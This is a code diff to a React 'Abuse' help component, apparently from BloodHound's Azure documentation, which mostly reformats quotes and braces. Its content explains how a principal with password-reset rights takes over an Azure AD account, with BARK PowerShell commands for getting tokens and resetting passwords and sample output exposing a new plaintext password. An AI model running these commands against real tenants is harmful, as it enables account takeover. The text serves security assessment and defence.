@@ -15,8 +15,8 @@ const Abuse = () => {
             <p>
                 The most simple way to execute this attack is to log into the Azure
                 Portal at portal.azure.com as the principal with the password reset
-                privilege, locate the target user in the Portal, and click “Reset
-                Password” on the target user’s overview tab.
+                privilege, locate the target user in the Portal, and click &quot;Reset
+                Password&quot; on the target user’s overview tab.
             </p>
 
             <p>
@@ -49,11 +49,10 @@ const Abuse = () => {
                 You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need
                 to either already have or create an MS Graph-scoped JWT for the user or
                 service principal with the ability to reset the target user’s password:
+            </p>
             <pre>
                 <code>
-                    {
-                        $MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token
-                    }
+                    $MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID &quot;&lt;service principal’s app id&gt;&quot; -ClientSecret &quot;&lt;service principal’s plain text secret&gt;&quot; -TenantName &quot;contoso.onmicrosoft.com&quot;).access_token
                 </code>
             </pre>
             <p>
@@ -62,30 +61,26 @@ const Abuse = () => {
             </p>
             <pre>
                 <code>
-                    {
-                        'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'
-                    }
+                    Set-AZUserPassword -Token $MGToken -TargetUserID &quot;d9644c...&quot; -Password &quot;SuperSafePassword12345&quot;
                 </code>
             </pre>
 
             <p>
-                If successful, the output will include a “204” status code:
+                If successful, the output will include a &quot;204&quot; status code:
             <pre>
                 <code>
-                    {
                         StatusCode        : 204
                         StatusDescription : NoContent
-                        Content           : {}
+                        Content           : &#123;&#125;
                         RawContent        : HTTP/1.1 204 NoContent
                                             Cache-Control: no-cache
                                             Strict-Transport-Security: max-age=31536000
                                             request-id: 94243...
                                             client-request-id: 94243...
                                             x-ms…
-                        Headers           : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…}
+                        Headers           : &#123;[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…&#125;
                         RawContentLength  : 0
-                        RelationLink      : {}
-                    }
+                        RelationLink      : &#123;&#125;
                 </code>
             </pre>
             </p>
@@ -105,11 +100,12 @@ const Abuse = () => {
                 one through various means. For example, you can use a refresh token
                 to acquire a Portal-scoped JWT by using BARK’s
                 Get-AzurePortalTokenWithRefreshToken cmdlet:
+            </p>
             <pre>
                 <code>
-                    {
-                        $PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"
-                    }
+
+                    $PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID &quot;contoso.onmicrosoft.com&quot;
+
                 </code>
             </pre>
             <p>
@@ -118,38 +114,35 @@ const Abuse = () => {
             </p>
             <pre>
                 <code>
-                    {
-                        Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID “targetuser@contoso.onmicrosoft.com”
-                    }
+
+                        Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID &quot;targetuser@contoso.onmicrosoft.com&quot;
+
                 </code>
             </pre>
 
             <p>
                 If successful, the response will look like this:
-            <pre>
-                <code>
-                    {
-                        StatusCode        : 200
-                        StatusDescription : OK
-                        Content           : "Gafu1918"
-                        RawContent        : HTTP/1.1 200 OK
-                                            Cache-Control: no-store
-                                            Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None
-                                            X-Content-Type-Options: no…
-                        Headers           : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…}
-                        Images            : {}
-                        InputFields       : {}
-                        Links             : {}
-                        RawContentLength  : 10
-                        RelationLink      : {}
-
-                    }
-                </code>
-            </pre>
             </p>
+                <pre>
+                    <code>
+
+                            StatusCode        : 200
+                            StatusDescription : OK
+                            Content           : &quot;Gafu1918&quot;
+                        RawContent        : HTTP/1.1 200 OK
+                                                Cache-Control: no-store
+                                                Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None
+                                                X-Content-Type-Options: no…
+                            Headers           : &#123;[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…&#125;
+                        Images            : &#123;&#125;
+                        InputFields       : &#123;&#125;
+                        Links             : &#123;&#125;
+                        RawContentLength  : 10
+                            RelationLink      : &#123;&#125;
+                    </code>
+                </pre>
             <p>
-                As you can see, the plain-text value of the user’s password is
-                visible in the “Content” parameter value.
+                As you can see, the plain-text value of the user’s password is visible in the &quot;Content&quot; parameter value.
             </p>
         </>
     );
